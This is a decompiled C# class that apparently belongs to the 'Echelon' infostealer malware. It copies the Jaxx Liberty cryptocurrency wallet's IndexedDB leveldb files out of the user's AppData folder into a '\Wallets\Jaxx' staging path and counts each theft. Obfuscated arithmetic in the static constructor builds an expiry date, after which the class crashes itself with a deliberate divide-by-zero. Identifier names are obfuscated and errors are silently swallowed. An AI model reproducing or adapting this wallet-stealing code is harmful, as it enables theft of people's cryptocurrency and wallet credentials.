using Echelon;
using System;
using System.IO;

internal class ax
{
	public static string a;

	public static void a(string js)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Global.AppDate + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(js + ax.a);
				fileInfo.CopyTo(js + ax.a + fileInfo.Name);
			}
			ba.a++;
		}
		catch
		{
		}
	}

	static ax()
	{
		DateTime d = new DateTime(-(~(8273888 >> 5) >> 7), ((0x759B0463 ^ -176018261) >> 3) + 268229355, --6, ~(--409194524 - 409194530), ((~-426800451 - 65543345) ^ -300235071) - -74277331, -(-262920995 ^ 0x2915B7EE) - 650013884);
		if ((d - DateTime.Now).TotalDays < 0.0)
		{
			int num = ~(8919152 - 8919153);
			num = (--351650815 + -351650814) / num;
		}
		ax.a = "\\Wallets\\Jaxx\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\";
	}
}
